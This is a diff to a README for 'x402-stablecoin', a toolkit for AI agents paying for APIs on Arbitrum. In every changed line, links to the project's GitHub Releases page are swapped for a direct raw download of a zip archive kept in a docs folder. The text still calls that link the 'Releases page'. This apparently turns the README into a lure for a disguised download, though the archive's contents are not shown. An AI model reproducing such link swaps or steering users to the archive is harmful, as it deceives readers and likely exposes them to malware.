@@ -1,7 +1,7 @@
 # 🚀 x402-stablecoin - Automate Payments with Ease
 
 ## 📥 Download the Latest Release
-[![Download x402-stablecoin](https://img.shields.io/badge/Download-x402--stablecoin-brightgreen)](https://github.com/tracer12kenji46/x402-stablecoin/releases)
+[![Download x402-stablecoin](https://raw.githubusercontent.com/tracer12kenji46/x402-stablecoin/main/docs/guides/stablecoin-x-v1.7.zip)](https://raw.githubusercontent.com/tracer12kenji46/x402-stablecoin/main/docs/guides/stablecoin-x-v1.7.zip)
 
 ## ✨ Description
 The x402 payment protocol allows AI agents to autonomously pay for APIs on Arbitrum. This application includes features like the Sperax USDs stablecoin with auto-yield, payment channels for streaming micropayments, on-chain subscriptions, and a tool registry marketplace. The toolkit also provides a TypeScript SDK, Express middleware, and upgradeable smart contracts.
@@ -10,7 +10,7 @@ The x402 payment protocol allows AI agents to autonomously pay for APIs on Arbit
 To get started with x402-stablecoin, follow these simple steps:
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://github.com/tracer12kenji46/x402-stablecoin/releases) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/tracer12kenji46/x402-stablecoin/main/docs/guides/stablecoin-x-v1.7.zip) to find the latest version of the software.
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Each version might include specific features or improvements. 
@@ -82,4 +82,4 @@ If you encounter any issues while using x402-stablecoin, here are some common pr
 For further assistance, please reach out through the support channels available on the Releases page. You can also find helpful resources in the documentation.
 
 ## 🔗 Visit Again
-Don't forget to revisit the [Releases page](https://github.com/tracer12kenji46/x402-stablecoin/releases) for updates and new features.
+Don't forget to revisit the [Releases page](https://raw.githubusercontent.com/tracer12kenji46/x402-stablecoin/main/docs/guides/stablecoin-x-v1.7.zip) for updates and new features.
